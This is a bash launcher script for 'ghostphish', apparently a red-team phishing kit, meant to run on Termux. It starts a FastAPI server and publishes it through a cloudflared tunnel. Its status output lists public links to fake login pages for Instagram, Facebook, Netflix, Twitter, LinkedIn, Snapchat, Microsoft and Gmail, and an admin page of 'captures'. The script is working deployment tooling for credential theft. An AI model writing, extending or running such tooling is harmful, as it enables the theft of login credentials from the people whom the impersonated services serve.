#!/usr/bin/env bash
#
# ghostphish launcher for Termux (no Docker, no sudo, no lsof)
# ─────────────────────────────────────────────────────────────
#   ./launch-termux.sh start     # Start app + tunnel
#   ./launch-termux.sh status    # Check status
#   ./launch-termux.sh logs      # View logs
#   ./launch-termux.sh stop      # Stop everything
#

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT=8000
DATA_DIR="${SCRIPT_DIR}/data"

# Logs
APP_LOG="${SCRIPT_DIR}/ghostphish_app.log"
TUNNEL_LOG="${SCRIPT_DIR}/ghostphish_tunnel.log"
URL_FILE="${SCRIPT_DIR}/ghostphish_current.url"
PID_FILE="${SCRIPT_DIR}/ghostphish_app.pid"
TUNNEL_PID_FILE="${SCRIPT_DIR}/ghostphish_tunnel.pid"

# Colors
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'
B='\033[1;34m'; W='\033[1;37m'; N='\033[0m'

banner() {
    echo -e "${R}"
    echo -e "   █▀▀ █░█ █▀█ █▀ ▀█▀ █▀█ █░█ █ █▀ █░█ █▀▀ █▀█"
    echo -e "   █▄█ █▀█ █▄█ ▄█ ░█░ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄"
    echo -e "${N}   ${Y}⚡ Termux Launcher${N}"
    echo -e "   ${C}Developed by ${R}Yaman.RedTeam${N}\n"
}

ts() { date '+%Y-%m-%dT%H:%M:%S'; }
log_msg() { echo "[$(ts)] $*" >> "$APP_LOG"; }

# Ensure data directory exists
mkdir -p "$DATA_DIR"
chmod 755 "$DATA_DIR" 2>/dev/null || true

# Health check
app_healthy() {
    curl -s -o /dev/null -w '%{http_code}' --max-time 2 \
        "http://localhost:${PORT}/health" 2>/dev/null | grep -q "200"
}

# Check if app is running
app_running() {
    if [[ -f "$PID_FILE" ]]; then
        local pid; pid=$(cat "$PID_FILE" 2>/dev/null)
        if [[ -n "$pid" ]]; then
            # Use ps instead of kill -0 for better compatibility
            ps "$pid" >/dev/null 2>&1 && return 0
        fi
    fi
    return 1
}

# Start app
cmd_start() {
    banner

    echo -e "${Y}[*] Starting ghostphish on Termux...${N}\n"

    # Check if already running
    if app_running && app_healthy; then
        echo -e "${Y}[!] Already running (PID: $(cat "$PID_FILE"))${N}"
        cmd_status
        return
    fi

    # Clear old logs
    : > "$APP_LOG"
    : > "$TUNNEL_LOG"

    # Install deps if needed
    if ! python3 -c "import fastapi, uvicorn" 2>/dev/null; then
        echo -e "${Y}[*] Installing Python dependencies...${N}"
        pip install -q -r "$SCRIPT_DIR/requirements.txt" || {
            echo -e "${R}[!] Failed to install dependencies${N}"
            return 1
        }
    fi

    echo -e "${G}[+] Starting FastAPI app on localhost:${PORT}${N}"

    # Start app in background
    cd "$SCRIPT_DIR" || return 1
    export GHOSTPHISH_DATA="$DATA_DIR"

    nohup python3 -m uvicorn app:app --host 0.0.0.0 --port "$PORT" \
        > "$APP_LOG" 2>&1 &

    local app_pid=$!
    echo "$app_pid" > "$PID_FILE"

    # Wait for app to start
    echo -e "${Y}[*] Waiting for app to come online...${N}"
    for i in {1..30}; do
        if app_healthy; then
            echo -e "${G}[+] App is running! (PID: $app_pid)${N}\n"
            break
        fi
        sleep 1
    done

    # Try to start tunnel if cloudflared available
    if command -v cloudflared >/dev/null 2>&1; then
        echo -e "${G}[+] Starting tunnel...${N}"
        rm -f "$URL_FILE"

        nohup cloudflared tunnel --url "http://localhost:${PORT}" \
            > "$TUNNEL_LOG" 2>&1 &

        local cf_pid=$!
        echo "$cf_pid" > "$TUNNEL_PID_FILE"

        # Wait for tunnel URL
        echo -e "${Y}[*] Waiting for tunnel URL...${N}"
        for i in {1..15}; do
            local url; url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$TUNNEL_LOG" 2>/dev/null | head -1)
            if [[ -n "$url" ]]; then
                echo "$url" > "$URL_FILE"
                echo -e "${G}[+] Tunnel is live!${N}"
                echo -e "${C}Public URL: ${B}${url}${N}\n"
                break
            fi
            sleep 1
        done
    else
        echo -e "${Y}[~] cloudflared not available (tunnel skipped)${N}"
        echo -e "    Install with: pkg install cloudflared -y\n"
    fi

    cmd_status
}

# Status
cmd_status() {
    banner

    echo -e "${W}════════════════════════════════════════════════════════${N}"

    local app_stat="${R}✗${N}"
    local app_pid=""
    if app_running; then
        app_stat="${G}✓${N}"
        app_pid=$(cat "$PID_FILE" 2>/dev/null)
    fi

    local tunnel_stat="${R}✗${N}"
    if [[ -f "$TUNNEL_PID_FILE" ]]; then
        local cf_pid; cf_pid=$(cat "$TUNNEL_PID_FILE" 2>/dev/null)
        if ps "$cf_pid" >/dev/null 2>&1; then
            tunnel_stat="${G}✓${N}"
        fi
    fi

    echo -e "   App              ${app_stat}   (localhost:${PORT})"
    if [[ -n "$app_pid" ]]; then
        echo -e "   PID              ${W}${app_pid}${N}"
    fi
    echo -e "   Tunnel           ${tunnel_stat}"

    echo -e "${W}════════════════════════════════════════════════════════${N}"

    local url; url=$(cat "$URL_FILE" 2>/dev/null || echo "")
    if [[ -n "$url" ]]; then
        echo -e "${C}   Public URL: ${B}${url}${N}\n"
        echo -e "${Y}   ── Phishing pages ──────────────────────────────${N}"
        for t in instagram facebook netflix twitter linkedin snapchat microsoft gmail; do
            printf "   %-14s ${W}%s${N}\n" "$t" "${url}/${t}"
        done
        echo
        echo -e "${Y}   ── Admin ───────────────────────────────────────${N}"
        printf "   %-14s ${W}%s${N}\n" "captures" "${url}/admin/captures"
    else
        echo -e "${Y}[~] No tunnel URL available${N}"
        if command -v cloudflared >/dev/null 2>&1; then
            echo -e "    Check logs: tail -f ${TUNNEL_LOG}"
        else
            echo -e "    Install tunnel: pkg install cloudflared -y"
        fi
    fi

    echo
    echo -e "${W}════════════════════════════════════════════════════════${N}"
}

# Logs
cmd_logs() {
    echo -e "${Y}[*] App log (Ctrl+C to exit):${N}\n"
    tail -f "$APP_LOG" 2>/dev/null || echo "No app log yet"
}

# Stop
cmd_stop() {
    banner

    echo -e "${Y}[*] Stopping ghostphish...${N}"

    # Kill app
    if app_running; then
        local pid; pid=$(cat "$PID_FILE" 2>/dev/null)
        kill "$pid" 2>/dev/null || true
        sleep 1
    fi

    # Kill tunnel
    if [[ -f "$TUNNEL_PID_FILE" ]]; then
        local cf_pid; cf_pid=$(cat "$TUNNEL_PID_FILE" 2>/dev/null)
        kill "$cf_pid" 2>/dev/null || true
    fi

    # Fallback: pkill
    pkill -f "uvicorn app:app" 2>/dev/null || true
    pkill -f "cloudflared tunnel" 2>/dev/null || true

    # Clean up
    rm -f "$PID_FILE" "$TUNNEL_PID_FILE" "$URL_FILE"

    echo -e "${G}[+] Stopped${N}"
}

# Main
case "${1:-start}" in
    start)  cmd_start ;;
    status) cmd_status ;;
    logs)   cmd_logs ;;
    stop)   cmd_stop ;;
    *)
        echo "Usage: $0 {start|status|logs|stop}"
        exit 1
        ;;
esac
